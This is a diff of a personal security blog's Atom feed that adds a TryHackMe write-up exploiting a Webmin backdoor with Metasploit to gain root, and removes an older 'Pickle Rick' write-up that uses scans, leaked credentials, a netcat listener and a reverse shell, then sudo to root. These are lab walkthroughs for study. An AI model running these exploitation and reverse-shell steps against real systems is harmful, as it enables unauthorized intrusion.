@@ -1,4 +1,96 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-24T17:13:05+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-25T17:51:25+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Source</title><link href="http://localhost:4000/tryhackme-source/" rel="alternate" type="text/html" title="TryHackMe - Source" /><published>2023-03-25T00:00:00+03:00</published><updated>2023-03-25T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-source</id><content type="html" xml:base="http://localhost:4000/tryhackme-source/"><![CDATA[<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-embark">1. Embark</h2>
+
+<p>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</p>
+
+<p><br /></p>
+
+<h3 id="11-usertxt">1.1 user.txt</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.11.143
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 1000/tcp HTTP</code></strong>.</p>
+
+<p>I am visiting the Webmin page running on port 1000. I see a page like this:</p>
+
+<p><img src="/assets/img/tryhackme/source/home.png" alt="home" /></p>
+
+<p>I fix the URL as HTTP like this <a href="https://10.10.11.143:10000/">https://10.10.11.143:10000/</a></p>
+
+<p>The Webmin login page appears on the page.</p>
+
+<p><img src="/assets/img/tryhackme/source/login.png" alt="login" /></p>
+
+<p>I tried several login attempts but it didn’t work. I’m searching for any security vulnerabilities in the version of Webmin used.</p>
+
+<p><img src="/assets/img/tryhackme/source/browse.png" alt="browse" /></p>
+
+<p>I see that this version of Webmin is vulnerable.</p>
+
+<p>I decide to do a search using Metasploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search webmin
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/search.png" alt="search" /></p>
+
+<p>I’ve tried most of the ones here. I can only run <strong><code class="language-plaintext highlighter-rouge">7 exploit/linux/http/webmin_backdoor</code></strong>.</p>
+
+<p>Let’s do the settings first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ set RHOSTS 10.10.11.143
+$ set LHOST 10.8.86.168
+$ set SSL true
+$ show options
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/source/set.png" alt="set" /></p>
+
+<p>After making the settings, it should look like this.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ show options
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/options.png" alt="options" /></p>
+
+<p>Let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ run
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/run.png" alt="run" /></p>
+
+<p>Yes, it worked. We are inside with root privilege.</p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-roottxt">1.2 root.txt</h3>
+
+<p>Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
 
 <p>Let’s start.</p>
 
@@ -1715,157 +1807,4 @@ msf6 &gt; exploit
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="windows," /><category term="eternal blue," /><category term="MS17-010" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blue.gif" /><media:content medium="image" url="http://localhost:4000/assets/img/blue.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Pickle Rick</title><link href="http://localhost:4000/tryhackme-pickle-rick/" rel="alternate" type="text/html" title="TryHackMe - Pickle Rick" /><published>2023-03-15T00:00:00+03:00</published><updated>2023-03-15T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-pickle-rick</id><content type="html" xml:base="http://localhost:4000/tryhackme-pickle-rick/"><![CDATA[<p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
-Deploy the virtual machine on this task and explore the web application: “http://target-ip/”</p>
-
-<p><br /></p>
-
-<h3 id="1-what-is-the-first-ingredient-rick-needs">1. What is the first ingredient Rick needs?</h3>
-
-<p>First, we run a <strong><code class="language-plaintext highlighter-rouge">nmap</code></strong> scan as usual.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.125.149
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/nmap.png" alt="nmap" /></p>
-
-<p>As you can see there are 2 ports running.</p>
-
-<p>Let’s visit the website and see what we can find.
-On the homepage, we see such an article.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/home.png" alt="home" /></p>
-
-<p>In summary, Rick needs 3 ingredients to get back to his old self. The names of these ingredients are located inside the target machine. First of all, we need to find rick’s password and username and login into the target.</p>
-
-<p>Now let’s do a <strong><code class="language-plaintext highlighter-rouge">gobuster</code></strong> scan and see if we can find anything.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.125.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/gobuster.png" alt="gobuster" /></p>
-
-<p>Nothing came out.</p>
-
-<p>Let’s do a <strong><code class="language-plaintext highlighter-rouge">nikto</code></strong> scan and see if we can find anything there.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nikto -h http://10.10.125.149/
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/nikto.png" alt="nikto" /></p>
-
-<p>Yes, we found something important here. <strong><code class="language-plaintext highlighter-rouge">login.php</code></strong> is most likely the place where we should log in.</p>
-
-<p>We return to the homepage. We will take a look at the source codes of the pages.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/source.png" alt="source" /></p>
-
-<p>Yes, we found Rick’s username. 
-<strong><code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p>I checked the source code of the login page, but nothing came up.</p>
-
-<p>We check what is there in robots.txt, which is one of the classic control points. And we find an article I’m not sure about, but this article may be the password.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/robot.png" alt="robot" /></p>
-
-<p>I go back to the login page and try username and password.</p>
-
-<p><strong>Username: <code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p><strong>Password: <code class="language-plaintext highlighter-rouge">Wubbalubbadubdub</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/login.png" alt="login" /></p>
-
-<p>And we are inside.
-A command panel appears directly in front of us.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whoami.png" alt="whoami" /></p>
-
-<p>Let’s take a look at the /home directory, who are our users?</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whois.png" alt="whois" /></p>
-
-<p>I’m looking to see what’s in the directory we’re in. <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/ls.png" alt="ls" /></p>
-
-<p>And it looks like there are important files here.</p>
-
-<p>First, let’s take a look at what’s inside the clue.txt. <strong><code class="language-plaintext highlighter-rouge">cat clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/cat.png" alt="cat" /></p>
-
-<p>The cat command is blocked. We can use less instead. Let’s do it. <strong><code class="language-plaintext highlighter-rouge">less clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/less.png" alt="less" /></p>
-
-<p><em>clue.txt: Look around the file system for the other ingredient.</em></p>
-
-<p>Yes the less command worked.</p>
-
-<p>Now we can look at our first ingredient. <strong><code class="language-plaintext highlighter-rouge">less Sup3rS3cretPickl3Ingred.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/first.png" alt="first" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">mr. meeseek hair</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="2-whats-the-second-ingredient-rick-needs">2. Whats the second ingredient Rick needs?</h3>
-
-<p>You remember the rick directory in /home from the previous question. Most likely the second ingredient is here and the third is in the root directory.
-I tried going to the/rick directory but it didn’t work so I can’t change the directory from the command panel. To solve this, we can run a reverse shell on the system and enter the target machine directly.</p>
-
-<p>First I set up a netcat listener on my own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-<p>I go to the pentest monkey cheat sheet <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.
-And I’m trying the codes on the page. Those two are working.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/shell.png" alt="shell" /></p>
-
-<p>And we are inside.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/nc.png" alt="nc" /></p>
-
-<p>Now we can go to the rick directory.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/rick
-$ cat second\ ingredients
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/second.png" alt="second" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">jerry tear</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="3-whats-the-final-ingredient-rick-needs">3. Whats the final ingredient Rick needs?</h3>
-
-<p>For the third ingredient, we need to get root privileges.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/privesc.png" alt="privesc" /></p>
-
-<p>No password is set for root.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-$ sudo bash
-</code></pre></div></div>
-
-<p>Now we can reach the third ingredient and save rick.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /root
-$ cat /root/3rd.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/3rd.png" alt="3rd" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">fleeb juice</code></strong></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="gobuster," /><category term="linux" /><summary type="html"><![CDATA[This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. Deploy the virtual machine on this task and explore the web application: “http://target-ip/”]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/picle_rick.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/picle_rick.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="windows," /><category term="eternal blue," /><category term="MS17-010" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blue.gif" /><media:content medium="image" url="http://localhost:4000/assets/img/blue.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
